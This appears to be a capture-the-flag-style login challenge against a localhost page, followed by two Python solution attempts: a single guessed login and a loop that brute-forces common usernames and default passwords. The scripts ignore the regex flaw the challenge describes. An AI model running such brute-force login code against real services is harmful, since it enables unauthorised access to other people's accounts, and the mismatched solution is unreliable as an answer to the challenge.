"""
**Challenge 1: "The Laughable Login"**

You stumble upon a login page with a supposed vulnerability in its username validation. Write a Python script to exploit this weakness and gain unauthorized access.

The login page is located at `http://localhost:8080/login`, and the vulnerable username field is `username`. The password is not relevant for this challenge.

To make things "easier" for you, I'll give you a hint: the vulnerability lies in the way the username is validated using a regex pattern. Figure out the pattern and craft a malicious input to bypass it.

Submit your pathetic attempt at a solution, and I'll be happy to ridicule your code and point out all the mistakes you've made.
"""

"""
import requests

# Define the target URL
url = "http://localhost:8080/login"

# Crafting a malicious username that might exploit a regex vulnerability
# Let's assume the pattern might be allowing some specific special characters to pass
malicious_username = "admin"  # This would pass the alphanumeric check

# Prepare the data payload
data = {
    'username': malicious_username,
    'password': 'admin123'  # Password matches for a successful login
}

# Send the POST request to the login page
response = requests.post(url, data=data)

# Check if login was successful
if "Welcome" in response.text:
    print("Login successful! Access granted.")
else:
    print("Login failed! Access denied.")
"""

import requests

# Define the target URL
url = "http://localhost:8080/login"

# List of possible usernames (can be loaded from a file or database)
usernames = [
    'admin', 'user', 'guest', 'root', 'test', 'administrator_'
    # Add more usernames to the list as needed
]

# List of possible passwords (can also be loaded from a file or database)
passwords = [
    '123456', 'password', 'admin123', 'welcome', 'admin_123', 'letmein', 'admin', 'password1'
    # Add more passwords to the list as needed
]

# Loop through each username
for username in usernames:
    # Loop through each password for the current username
    for password in passwords:
        # Prepare the data payload
        data = {
            'username': username,
            'password': password
        }

        # Send the POST request to the login page
        response = requests.post(url, data=data)

        # Check if login was successful
        if "Welcome" in response.text:
            print(f"Login successful! Access granted with username: {username} and password: {password}")
            break  # Stop checking once a successful login is found
        else:
            print(f"Login failed for username: {username} with password: {password}")
    else:
        # If no successful login is found for the current username, continue with the next username
        continue
    # If a successful login was found, exit the outer loop as well
    break

